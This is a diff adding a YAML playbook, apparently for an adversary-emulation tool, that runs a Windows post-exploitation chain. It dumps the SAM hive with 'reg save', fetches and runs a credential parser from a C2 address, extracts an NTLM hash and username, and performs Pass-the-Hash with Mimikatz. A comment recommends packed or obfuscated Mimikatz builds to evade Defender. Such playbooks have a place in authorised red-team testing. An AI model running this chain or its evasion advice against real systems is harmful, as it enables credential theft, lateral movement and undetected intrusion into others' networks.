@@ -1,0 +1,103 @@
+id: windows-pth-demo
+name: "Windows Pass-the-Hash Demo"
+description: >
+  Post-exploitation chain on win_target (reached via linux_pivot). Confirms the
+  host is Windows, dumps the SAM hive, extracts an NTLM hash + username, then
+  performs Pass-the-Hash. This is the runnable version of the README snippet:
+  the README's inline example is missing output_extract (so the PtH step had
+  nothing to substitute) and used a Linux-ambiguous discovery index.
+mitre_tactics: [discovery, credential-access, lateral-movement]
+tags: [windows, pth, demo]
+
+steps:
+  # ── Phase 1 — confirm we are actually on Windows ────────────────────────────
+  - id: check_os
+    name: "Confirm Windows target"
+    action:
+      type: probe
+      probe:
+        kind: os
+        platform: windows
+    output_var: victim_os          # captures OS caption, e.g. "Microsoft Windows 10..."
+    timeout: "30s"
+    on_fail: abort                 # if this isn't Windows, nothing below applies
+
+  - id: hostname_disc
+    name: "Windows hostname discovery"
+    depends_on: [check_os]
+    conditions:
+      - victim_os|contains: Windows
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1082
+        test: 6                    # "Hostname Discovery (Windows)" — Windows-specific
+    output_var: hostname
+    timeout: "30s"
+    on_fail: continue              # non-critical recon
+
+  # ── Phase 2 — credential access: dump SAM hive ──────────────────────────────
+  - id: dump_sam
+    name: "Dump SAM hive"
+    depends_on: [check_os]
+    conditions:
+      - victim_os|contains: Windows
+    action:
+      type: command
+      command:
+        interpreter: cmd
+        # reg save is the most portable SAM dump; the atomic T1003.002 test 0
+        # does the same but this keeps the stdout deterministic for the gate below.
+        cmd: 'reg save HKLM\SAM C:\Windows\Temp\sam.hive /y && echo SAM_SAVED_OK'
+    output_var: dump_stdout
+    timeout: "60s"
+    on_fail: abort                 # no hive → no creds → stop
+
+  # ── Extract creds. Requires an offline SAM parser dropped on the host, OR
+  #    swap this step's binary for your own mimikatz/secretsdump equivalent.
+  #    The point of THIS step is to demonstrate output_extract → {{VarName}}.
+  - id: parse_creds
+    name: "Parse NTLM hash + username from SAM"
+    depends_on: [dump_sam]
+    conditions:
+      - dump_stdout|contains: "SAM_SAVED_OK"
+    action:
+      type: binary
+      binary:
+        # Host your own creds parser (e.g. a static secretsdump/pypykatz build)
+        # on the C2 and point this URL at it. Raw mimikatz.exe will be caught by
+        # Defender — use a packed/obfuscated build or an offline hive parser.
+        url: "http://192.168.56.5:8888/samparse.exe"
+        remote_path: "C:\\Windows\\Temp\\sp.exe"
+        args: "C:\\Windows\\Temp\\sam.hive"
+        platform: windows
+        cleanup: true
+    # THIS is the piece the README snippet was missing — capture into variables
+    # so the PtH step below can substitute them.
+    output_extract:
+      - var: ntlm_hash
+        regex: "NTLM\\s*:\\s*([0-9a-fA-F]{32})"
+        group: 1
+      - var: cred_user
+        regex: "Username\\s*:\\s*(\\S+)"
+        group: 1
+    timeout: "120s"
+    on_fail: abort
+
+  # ── Phase 3 — lateral movement: Pass-the-Hash ───────────────────────────────
+  - id: pass_the_hash
+    name: "Pass-the-Hash with recovered NTLM"
+    depends_on: [parse_creds]
+    conditions:
+      # only fire if we actually captured a 32-hex NTLM hash
+      - ntlm_hash|matches: "^[0-9a-fA-F]{32}$"
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1550.002
+        test: 0                     # "Mimikatz Pass the Hash" (Windows)
+        args:
+          ntlm_hash: "{{ntlm_hash}}"   # substituted from parse_creds output_extract
+          username:  "{{cred_user}}"
+    timeout: "120s"
+    on_fail: continue
